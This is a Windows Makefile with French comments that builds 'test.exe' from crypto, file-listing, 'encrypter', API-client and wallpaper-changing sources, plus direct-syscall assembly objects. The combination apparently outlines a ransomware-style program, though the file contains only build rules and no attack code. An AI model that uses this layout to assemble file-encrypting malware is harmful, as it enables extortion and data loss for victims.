# Nom de l'exécutable
TARGET = test.exe

# Répertoires
INCLUDE_DIR = include
SRC_DIR = src
CORE_DIR = $(SRC_DIR)/core
UTILS_DIR = $(SRC_DIR)/utils
ASM_DIR = $(CORE_DIR)/assembly

# Options du compilateur
CFLAGS = -O0 -g -I$(INCLUDE_DIR)

# Fichiers source C
SRC = \
  $(CORE_DIR)/my_aes.c \
  $(CORE_DIR)/rsa.c \
  $(UTILS_DIR)/rng.c \
  $(UTILS_DIR)/bn.c \
  $(CORE_DIR)/api_client.c \
  $(CORE_DIR)/encrypter.c \
  $(CORE_DIR)/aes_wrapper.c \
  $(CORE_DIR)/list_files.c \
  $(CORE_DIR)/changeBackground.c \
  ./main.c 

# Objets assembleur (déjà compilés en .o)
ASM_OBJ = \
  $(ASM_DIR)/NtCreateFile.o \
  $(ASM_DIR)/NtMapViewOfSection.o \
  $(ASM_DIR)/NtCreateSection.o

# Librairies
LIBS = -lws2_32 -lntdll

# Commande de compilation
$(TARGET): $(SRC) $(ASM_OBJ)
	gcc $(CFLAGS) -o $@ $(SRC) $(ASM_OBJ) $(LIBS)

# Cible pour nettoyer les fichiers générés
clean:
	del /Q $(TARGET)

.PHONY: clean
